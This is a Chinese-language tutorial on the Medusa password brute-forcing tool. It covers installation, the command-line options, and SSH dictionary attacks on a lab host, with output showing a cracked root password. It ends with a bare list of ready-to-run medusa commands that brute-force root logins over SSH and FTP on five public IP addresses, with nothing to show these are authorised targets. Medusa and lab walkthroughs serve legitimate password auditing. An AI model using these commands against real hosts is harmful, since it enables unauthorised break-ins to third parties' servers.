## Medusa

Medusa(美杜莎)是一个速度快，支持大规模并行，模块化的爆力破解工具。

可以同时对多个主机，用户或密码执行强力测试。Medusa和hydra一样，同样属于在线密码破解工具。

Medusa是支持AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP (NetWare),NNTP,PcAnywhere, POP3, PostgreSQL, rexec, RDP、rlogin, rsh, SMBNT,SMTP(AUTH/VRFY),SNMP, SSHv2, SVN, Telnet, VmAuthd, VNC、Generic Wrapper以及Web表单的密码爆破工具。

官方网站：http://foofus.net/goons/jmk/medusa/medusa.html。
 
## 安装medusa

    [root@k5 ~]# yum install libssh2-devel libssh2-devel  -y
    [root@k5 ~]# tar zxvf 2.2.tar.gz
    [root@k5 ~]# cd medusa-2.2/
    [root@k5 medusa-2.2]# ./configure   --enable-debug=yes --enable-module-afp=yes --enable-module-cvs=yes --enable-module-ftp=yes --enable-module-http=yes --enable-module-imap=yes --enable-module-mssql=yes --enable-module-mysql=yes --enable-module-ncp=yes --enable-module-nntp=yes --enable-module-pcanywhere=yes --enable-module-pop3=yes --enable-module-postgres=yes --enable-module-rexec=yes --enable-module-rlogin=yes --enable-module-rsh=yes --enable-module-smbnt=yes --enable-module-smtp=yes --enable-module-smtp-vrfy=yes --enable-module-snmp=yes --enable-module-ssh=yes --enable-module-svn=yes --enable-module-telnet=yes --enable-module-vmauthd=yes --enable-module-vnc=yes --enable-module-wrapper=yes --enable-module-web-form=yes
    
    #这个参数中加入很多模块，这样方便后期使用。--enable-module-ssh=yes这个就是稍后要使用的暴力破解sshd服务的模块。
    [root@k5 medusa-2.2]#make -j 4
    
    [root@k5 medusa-2.2]# make install         
    # 安装完成后，会将medusa的一些modules 文件复制到/usr/local/lib/medusa/modules文件夹。
    
    [root@k5 ~]# ls /usr/local/lib/medusa/modules  #查看已经生成的模块

 
## Medusa参数说明
    Medusa [-hhost|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module[OPT]
    -h [TEXT]      目标主机名称或者IP地址
    -H [FILE]       包含目标主机名称或者IP地址文件
    -u [TEXT]      测试的用户名
    -U [FILE]       包含测试的用户名文件
    -p [TEXT]      测试的密码
    -P [FILE]       包含测试的密码文件
    -C [FILE]       组合条目文件
    -O [FILE]       日志信息文件
    -e [n/s/ns]    n代表空密码，s代表为密码与用户名相同
    -M [TEXT]      模块执行名称
    -m [TEXT]      传递参数到模块
    -d                 显示所有的模块名称
    -n [NUM]       使用非默认Tcp端口
    -s                 启用SSL
    -r [NUM]       重试间隔时间，默认为3秒
    -t [NUM]       设定线程数量
    -T             同时测试的主机总数
    -L                 并行化，每个用户使用一个线程
    -f                 在任何主机上找到第一个账号/密码后，停止破解
    -F                在任何主机上找到第一个有效的用户名/密码后停止审计。
    -q                显示模块的使用信息
    -v [NUM]      详细级别（0-6）
    -w [NUM]     错误调试级别（0-10）
    -V                显示版本
    -Z [TEXT]      继续扫描上一次
 
## 破解单一服务器SSH密码

    例1：通过文件来指定host和user，host.txt为目标主机名称或者IP地址，user.txt指定需要暴力破解的用户名，密码指定为123456。
    [root@k5 medusa-2.2]# cd
    [root@k5 ~]# echo 10.27.17.34 > /root/host.txt
    [root@k5 ~]# echo root > /root/users.txt
    [root@k5 ~]# medusa -M ssh -H ./host.txt -U ./users.txt -p 123456
    
     
    注：可以看到暴解成功。
     
    例2：对单一服务器进行密码字典暴力破解
    [root@k5 ~]# vim /root/p.txt       #写入以下内容，每行一个密码，做一个临时字典 。
    123
    abc123
    123456
    666666
    注：其中123456 是我们的密码
    [root@k5 ~]# medusa -M ssh -H ./host.txt -U ./users.txt -P p.txt
     
    例3：加-O  ssh.log 可以将成功破解的记录记录到ssh.log文件中
    [root@k5 medusa-2.2]# medusa -M ssh -H /root/host.txt -U /root/users.txt -P /root/p.txt -O ./ssh.log
    
    
    ACCOUNT CHECK: [ssh] Host: 10.27.17.34 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 123456 (2 of 861 complete)
    ACCOUNT FOUND: [ssh] Host: 10.27.17.34 User: root Password: 123456 [SUCCESS]
    [root@k5 ~]# cat ssh.log
    # Medusa has finished (2019-09-19 11:13:37).
    # Medusa v.2.2 (2019-09-19 11:15:16)
    # medusa -M ssh -H /root/host.txt -U /root/users.txt -P /root/p.txt -O ./ssh.log 
    # Medusa v.2.2 (2019-09-19 11:26:37)
    # medusa -M ssh -H /root/host.txt -U /root/users.txt -P /root/p.txt -O ./ssh.log 
    ACCOUNT FOUND: [ssh] Host: 10.27.17.34 User: root Password: 123456 [SUCCESS]
    # Medusa has finished (2019-09-19 11:26:40).

---


    medusa -M ssh -h 39.97.210.249 -u root  -P /root/passwords.txt -O ./ssh.log  -n 9981 -t 10
    
    medusa -M ssh -h 122.51.211.131 -u root  -P /root/passwords.txt -O ./ssh.log  -t 10
    
    medusa -M ssh -h 123.57.158.241 -u root -P /root/passwords.txt -O ./ssh.log -t 10
    
    medusa -M ssh -h 59.110.218.150 -u root -P /root/passwords.txt -O ./ssh.log -t 10
    
    medusa -M ftp -h 92.91.113.163 -u root -P /root/passwords.txt -O ./ssh.log -t 10